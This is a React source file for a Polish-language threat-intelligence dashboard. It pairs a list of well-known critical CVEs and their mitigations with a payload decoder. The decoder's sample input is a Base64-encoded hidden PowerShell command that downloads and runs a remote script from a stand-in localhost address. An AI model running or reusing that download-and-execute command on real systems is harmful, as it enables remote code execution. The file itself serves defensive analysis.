import React, { useState } from 'react';
import { 
  Radar, 
  Search, 
  ShieldAlert, 
  Binary, 
  Code, 
  Copy, 
  Check, 
  ExternalLink,
  ChevronRight,
  Flame,
  ArrowUpDown
} from 'lucide-react';
import { ThreatItem } from '../types';
import { playTerminalKeySound, playSuccessSound, playBeep } from '../utils/audio';

const THREAT_FEED: ThreatItem[] = [
  {
    id: 'cve-1',
    cve: 'CVE-2024-3094',
    title: 'Backdoor w łańcuchu dostaw upstream XZ Utils (Liblzma)',
    severity: 'CRITICAL',
    cvss: 10.0,
    category: 'Łańcuch dostaw / Zdalne wykonanie kodu (RCE)',
    mitreTactic: 'Początkowy dostęp (Initial Access), Omijanie obrony (Defense Evasion)',
    description: 'Złośliwy kod wstrzyknięty do archiwów wydań xz/liblzma modyfikuje funkcję uwierzytelniania sshd poprzez przechwytywanie funkcji pośrednich (IFUNC), umożliwiając RCE przed uwierzytelnieniem za pomocą określonego klucza prywatnego.',
    mitigation: 'Cofnij wersję do xz 5.4.6 lub czystej gałęzi. Przeskanuj systemy kompilacji pod kątem złośliwych makr m4.',
  },
  {
    id: 'cve-2',
    cve: 'CVE-2024-6387',
    title: 'regreSSHion: Zdalne wykonanie kodu w serwerze OpenSSH',
    severity: 'CRITICAL',
    cvss: 8.1,
    category: 'Wyścig (Race Condition) / Uszkodzenie pamięci',
    mitreTactic: 'Eskalacja uprawnień, Wykonanie kodu',
    description: 'Stan wyścigu w procedurze obsługi sygnałów w OpenSSH sshd (handler SIGALRM wywołuje funkcje niebezpieczne pod kątem async-signal, takie jak syslog), co pozwala na nieuwierzytelnione RCE z uprawnieniami root w systemach Linux opartych na glibc.',
    mitigation: 'Zaktualizuj OpenSSH do wersji 9.8p1+ lub ustaw LoginGraceTime 0 w sshd_config jako natychmiastowe obejście.',
  },
  {
    id: 'cve-3',
    cve: 'CVE-2024-21626',
    title: 'Leaky Vessels: Ucieczka z kontenera runc przez wyciek deskryptora pliku',
    severity: 'CRITICAL',
    cvss: 8.6,
    category: 'Ucieczka z kontenera (Container Breakout)',
    mitreTactic: 'Eskalacja uprawnień, Ucieczka z kontenera',
    description: 'Wewnętrzny wyciek deskryptora pliku w runc pozwala atakującemu wewnątrz kontenera uzyskać dostęp do systemu plików hosta przez /proc/self/fd/7 i nadpisać pliki binarne hosta.',
    mitigation: 'Zaktualizuj runc do wersji 1.1.12+ oraz zaktualizuj środowiska uruchomieniowe Docker/Kubernetes.',
  },
  {
    id: 'cve-4',
    cve: 'CVE-2023-38606',
    title: 'Operacja Triangulation: Obejście pamięci sprzętowej MMIO w jądrze Apple',
    severity: 'CRITICAL',
    cvss: 9.8,
    category: 'Rejestry sprzętowe / Obejście ochrony pamięci',
    mitreTactic: 'Omijanie obrony, Eskalacja uprawnień',
    description: 'Obejście sprzętowej ochrony pamięci (Page Protection Layer - PPL) poprzez zapis do nieudokumentowanych rejestrów sprzętowych MMIO.',
    mitigation: 'Zaktualizuj systemy iOS/macOS do najnowszych wydań z blokadą rejestrów MMIO.',
  },
  {
    id: 'cve-5',
    cve: 'CVE-2021-44228',
    title: 'Log4Shell: Zdalne wykonanie kodu przez JNDI w Apache Log4j2',
    severity: 'CRITICAL',
    cvss: 10.0,
    category: 'Niezaufana deserializacja / Wyszukiwanie JNDI',
    mitreTactic: 'Początkowy dostęp, Wykonanie kodu',
    description: 'Przetwarzanie ciągów ${jndi:ldap://...} przez bibliotekę Log4j wywołuje zdalne zapytanie LDAP i deserializację niezaufanego kodu w języku Java.',
    mitigation: 'Zaktualizuj do Log4j 2.17.1+ lub ustaw flagę log4j2.formatMsgNoLookups=true.',
  },
  {
    id: 'cve-6',
    cve: 'CVE-2023-4863',
    title: 'Przepełnienie bufora na stercie w libwebp podczas przetwarzania WebP',
    severity: 'CRITICAL',
    cvss: 8.8,
    category: 'Przepełnienie sterty (Heap Overflow)',
    mitreTactic: 'Wykonanie kodu, Początkowy dostęp',
    description: 'Zapis poza zakresem podczas parsowania tablicy Huffmana w libwebp pozwala na wykonanie dowolnego kodu za pomocą spreparowanego obrazu .webp w przeglądarkach oraz aplikacjach Electron i Tauri.',
    mitigation: 'Zaktualizuj libwebp oraz silniki przeglądarek (Chromium, WebKit).',
  },
];

export const ThreatIntel: React.FC = () => {
  const [search, setSearch] = useState('');
  const [selectedThreat, setSelectedThreat] = useState<ThreatItem>(THREAT_FEED[0]);

  // Deobfuscator tools state
  const [deobInput, setDeobInput] = useState('powershell -nop -w hidden -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==');
  const [deobOutput, setDeobOutput] = useState('');
  const [deobMode, setDeobMode] = useState<'b64dec' | 'b64enc' | 'hexdec' | 'hexenc' | 'urldec' | 'urlenc' | 'rot13'>('b64dec');
  const [copiedOut, setCopiedOut] = useState(false);

  const filteredThreats = THREAT_FEED.filter(
    (t) =>
      t.cve.toLowerCase().includes(search.toLowerCase()) ||
      t.title.toLowerCase().includes(search.toLowerCase()) ||
      t.category.toLowerCase().includes(search.toLowerCase())
  );

  const processDeob = (mode = deobMode, inputStr = deobInput) => {
    playTerminalKeySound();
    try {
      if (mode === 'b64dec') {
        // Handle potential utf-16LE in powershell
        let cleanInput = inputStr.trim();
        // check if has -e or -enc
        const match = cleanInput.match(/-e(?:nc)?\s+([A-Za-z0-9+/=]+)/i);
        if (match) cleanInput = match[1];

        const raw = atob(cleanInput);
        // check if utf-16 le
        let result = '';
        if (raw.indexOf('\0') !== -1) {
          for (let i = 0; i < raw.length; i += 2) {
            result += raw[i];
          }
        } else {
          result = raw;
        }
        setDeobOutput(result);
      } else if (mode === 'b64enc') {
        setDeobOutput(btoa(inputStr));
      } else if (mode === 'hexdec') {
        const cleanHex = inputStr.replace(/[^0-9A-Fa-f]/g, '');
        let str = '';
        for (let i = 0; i < cleanHex.length; i += 2) {
          str += String.fromCharCode(parseInt(cleanHex.substring(i, i + 2), 16));
        }
        setDeobOutput(str);
      } else if (mode === 'hexenc') {
        let hex = '';
        for (let i = 0; i < inputStr.length; i++) {
          hex += inputStr.charCodeAt(i).toString(16).padStart(2, '0') + ' ';
        }
        setDeobOutput(hex.trim());
      } else if (mode === 'urldec') {
        setDeobOutput(decodeURIComponent(inputStr));
      } else if (mode === 'urlenc') {
        setDeobOutput(encodeURIComponent(inputStr));
      } else if (mode === 'rot13') {
        const rot13 = inputStr.replace(/[a-zA-Z]/g, (c) => {
          const code = c.charCodeAt(0);
          const base = code <= 90 ? 65 : 97;
          return String.fromCharCode(((code - base + 13) % 26) + base);
        });
        setDeobOutput(rot13);
      }
      playSuccessSound();
    } catch (err: any) {
      setDeobOutput(`[DECODING_ERROR]: ${err.message}`);
    }
  };

  const copyResult = () => {
    if (!deobOutput) return;
    navigator.clipboard.writeText(deobOutput);
    setCopiedOut(true);
    playBeep(900, 0.05);
    setTimeout(() => setCopiedOut(false), 2000);
  };

  return (
    <div className="flex flex-col h-[calc(100vh-105px)] bg-[#0b0f19] font-sans text-xs overflow-y-auto">
      {/* Top Banner */}
      <div className="px-5 py-3 bg-[#0f1626] border-b border-slate-800 flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2.5">
          <div className="p-1.5 rounded-md bg-cyan-950/80 border border-cyan-800/80">
            <Radar className="w-4 h-4 text-cyan-400" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-semibold text-slate-100 text-sm">Wywiad o Zagrożeniach i Analiza Ładunków (Threat Intel)</span>
              <span className="px-1.5 py-0.5 rounded bg-slate-800 text-slate-400 text-[10px] font-mono border border-slate-700">MITRE ATT&amp;CK</span>
            </div>
            <p className="text-slate-400 text-[11px]">Baza taksonomii CVE, analiza przyczyn źródłowych podatności oraz dekonstrukcja wieloformatowych ładunków</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <div className="flex items-center bg-slate-900 border border-slate-700/80 rounded-lg px-3 py-1.5 text-xs">
            <Search className="w-3.5 h-3.5 text-slate-400 mr-2" />
            <input
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Szukaj CVE, taktyki lub słowa kluczowego..."
              className="bg-transparent border-none outline-none text-slate-100 placeholder-slate-500 text-xs w-48 md:w-64 font-sans"
            />
          </div>
        </div>
      </div>

      {/* Split screen: Left CVE explorer, Right Payload deobfuscator */}
      <div className="flex-1 grid grid-cols-1 lg:grid-cols-2 gap-4 p-4 md:p-5 overflow-hidden">
        {/* Left: CVE Threat Intelligence List & Detail */}
        <div className="flex flex-col rounded-xl border border-slate-800 bg-[#0f172a] overflow-hidden shadow-sm">
          <div className="px-4 py-2.5 bg-[#131d31] border-b border-slate-800 flex items-center justify-between">
            <span className="text-slate-200 font-semibold flex items-center gap-2 text-xs">
              <ShieldAlert className="w-4 h-4 text-cyan-400" />
              Baza Wiedzy o Krytycznych CVE
            </span>
            <span className="text-slate-400 font-mono text-[11px]">{filteredThreats.length} zarejestrowanych zagrożeń</span>
          </div>

          <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
            {/* List */}
            <div className="w-full md:w-5/12 border-r border-slate-800 overflow-y-auto divide-y divide-slate-800/60 bg-[#0d1322]">
              {filteredThreats.map((item) => (
                <button
                  key={item.id}
                  onClick={() => {
                    setSelectedThreat(item);
                    playTerminalKeySound();
                  }}
                  className={`w-full text-left p-3 transition-colors block cursor-pointer ${
                    selectedThreat.id === item.id
                      ? 'bg-slate-800/90 border-l-2 border-cyan-400'
                      : 'hover:bg-slate-800/40'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-slate-100 text-xs font-mono">{item.cve}</span>
                    <span className="px-1.5 py-0.5 rounded bg-rose-950 text-rose-300 border border-rose-800 text-[10px] font-semibold">
                      CVSS {item.cvss}
                    </span>
                  </div>
                  <p className="text-slate-400 text-[11px] truncate mt-1 font-sans">{item.title}</p>
                </button>
              ))}
            </div>

            {/* Detail */}
            <div className="w-full md:w-7/12 p-4 overflow-y-auto space-y-3.5 bg-[#0f172a]">
              <div className="border-b border-slate-800 pb-3">
                <div className="flex items-center justify-between">
                  <h3 className="text-sm font-bold text-white font-mono">{selectedThreat.cve}</h3>
                  <span className="px-2 py-0.5 rounded-full bg-rose-950 text-rose-300 border border-rose-800 text-xs font-semibold">
                    CVSS {selectedThreat.cvss} • {selectedThreat.severity === 'CRITICAL' ? 'KRYTYCZNY' : selectedThreat.severity}
                  </span>
                </div>
                <h4 className="text-xs font-semibold text-slate-200 mt-1.5 leading-snug">{selectedThreat.title}</h4>
              </div>

              <div className="space-y-1">
                <span className="text-slate-400 text-[11px] font-medium uppercase tracking-wider block">Kategoria i Taktyki MITRE</span>
                <p className="text-cyan-300 text-xs font-mono">{selectedThreat.category}</p>
                <div className="inline-block px-2.5 py-0.5 rounded-md bg-slate-800 border border-slate-700 text-xs text-slate-300 font-sans mt-1">
                  {selectedThreat.mitreTactic}
                </div>
              </div>

              <div className="space-y-1">
                <span className="text-slate-400 text-[11px] font-medium uppercase tracking-wider block">Wektor Ataku i Przyczyna Źródłowa</span>
                <p className="text-slate-300 text-xs leading-relaxed">{selectedThreat.description}</p>
              </div>

              <div className="p-3 rounded-lg bg-[#111927] border border-slate-800 space-y-1">
                <span className="text-cyan-400 font-semibold text-xs block">Mitygacja Obronna i Rozwiązanie</span>
                <p className="text-slate-300 text-xs leading-relaxed">{selectedThreat.mitigation}</p>
              </div>
            </div>
          </div>
        </div>

        {/* Right: Payload Deconstructor & Obfuscation Decoder */}
        <div className="flex flex-col rounded-xl border border-slate-800 bg-[#0f172a] overflow-hidden shadow-sm">
          <div className="px-4 py-2.5 bg-[#131d31] border-b border-slate-800 flex flex-wrap items-center justify-between gap-2">
            <span className="text-slate-200 font-semibold flex items-center gap-2 text-xs">
              <Binary className="w-4 h-4 text-cyan-400" />
              Dekonstruktor i Deobfuskator Ładunków
            </span>

            {/* Transform modes */}
            <div className="flex items-center gap-2">
              <select
                value={deobMode}
                onChange={(e) => {
                  const m = e.target.value as any;
                  setDeobMode(m);
                  processDeob(m, deobInput);
                }}
                className="bg-slate-900 border border-slate-700 rounded-md px-2.5 py-1 text-slate-200 text-xs focus:outline-none font-mono"
              >
                <option value="b64dec">Dekodowanie Base64 (zgodne z UTF-16)</option>
                <option value="b64enc">Kodowanie Base64</option>
                <option value="hexdec">Dekodowanie Hex na ASCII</option>
                <option value="hexenc">Kodowanie ASCII na Hex</option>
                <option value="urldec">Dekodowanie URL</option>
                <option value="urlenc">Kodowanie URL</option>
                <option value="rot13">Szyfr ROT-13</option>
              </select>

              <button
                onClick={() => processDeob(deobMode, deobInput)}
                className="px-3 py-1 rounded-md bg-cyan-600 hover:bg-cyan-500 text-white font-medium text-xs transition-colors cursor-pointer"
              >
                Dekoduj
              </button>
            </div>
          </div>

          <div className="p-3 bg-[#0d1322] border-b border-slate-800">
            <span className="text-xs text-slate-400 font-medium block mb-1.5">Podejrzany Zakodowany Ładunek / Bufor Wejściowy</span>
            <textarea
              value={deobInput}
              onChange={(e) => setDeobInput(e.target.value)}
              placeholder="Wklej ciąg Base64, Hex, zakodowany adres URL lub zaciemnioną linię poleceń..."
              className="w-full h-28 p-3 bg-[#090d16] border border-slate-800 rounded-lg text-slate-200 font-mono text-xs outline-none resize-none focus:border-cyan-500/80"
              spellCheck={false}
            />
          </div>

          <div className="flex-1 p-3 bg-[#0f172a] flex flex-col overflow-hidden">
            <div className="flex items-center justify-between pb-1.5 mb-1.5 border-b border-slate-800 text-xs">
              <span className="text-slate-400 font-semibold text-xs">Zdekodowany Strumień Wyjściowy</span>
              <button
                onClick={copyResult}
                disabled={!deobOutput}
                className="flex items-center gap-1.5 px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-300 text-xs transition-colors cursor-pointer disabled:opacity-40"
              >
                {copiedOut ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                <span>{copiedOut ? 'Skopiowano' : 'Kopiuj'}</span>
              </button>
            </div>
            <textarea
              readOnly
              value={deobOutput}
              placeholder="Zdekodowany tekst jawny lub zrekonstruowany ładunek pojawi się tutaj..."
              className="flex-1 p-3 bg-[#090d16] border border-slate-800 rounded-lg text-slate-200 font-mono text-xs outline-none resize-none selection:bg-cyan-900/60"
            />
          </div>
        </div>
      </div>
    </div>
  );
};
